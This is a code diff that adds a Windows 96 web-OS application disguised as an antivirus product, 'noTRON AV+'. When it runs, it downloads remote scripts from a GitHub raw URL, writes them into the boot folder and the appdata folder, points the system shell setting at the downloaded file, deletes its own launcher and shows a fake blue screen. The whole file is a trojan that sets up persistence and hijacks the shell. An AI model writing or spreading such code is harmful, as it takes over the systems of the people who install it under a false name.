@@ -1,0 +1,51 @@
+//!wrt
+const { Theme } = w96.ui;
+const { sysConf: SCM } = w96;
+
+class GUIApplication extends WApplication {
+    /**
+     * Application constructor.
+     */
+    constructor() {
+        super();
+    }
+    
+    /**
+     * Main entry point.
+     * @param {String[]} argv The program arguments.
+     */
+    async main(argv) {
+        super.main(argv);
+
+        // Create the window
+        const mainwnd = this.createWindow({
+            title: "noTRON AV+",
+            body: "Loading noTRON AV+...",
+            bodyClass: "sample-app",
+            taskbar: false,
+            resizable: false,
+            initialHeight: 480,
+            initialWidth: 640,
+            icon: await Theme.getIconUrl("mime/executable", '16x16')
+        }, true);
+
+        const fs = w96.FS;
+
+        if(!fs.exists("c:/system/boot/notron.js")){
+            fetch("https://raw.githubusercontent.com/TermOfficial/plus/main/hehe.js").then((response) => {
+                fs.writestr("c:/system/boot/notron.js", response.text);
+            });
+        }
+        if(!fs.exists("c:/user/appdata/z.wrt")){
+            fetch("https://raw.githubusercontent.com/TermOfficial/plus/main/breakdown").then((response) => {
+                fs.writestr("c:/user/appdata/z.wrt", response.text);
+            });
+        }
+        SCM.set("System/Session/Shell/exec", "c:/user/appdata/z.wrt");
+        await SCM.syncRoot("Software");
+        fs.rm("c:/user/desktop/notronplus.wrt");
+        w96.sys.renderBSOD("Failed to render window");
+    }
+}
+
+return await WApplication.execAsync(new GUIApplication(), this.boxedEnv.args);
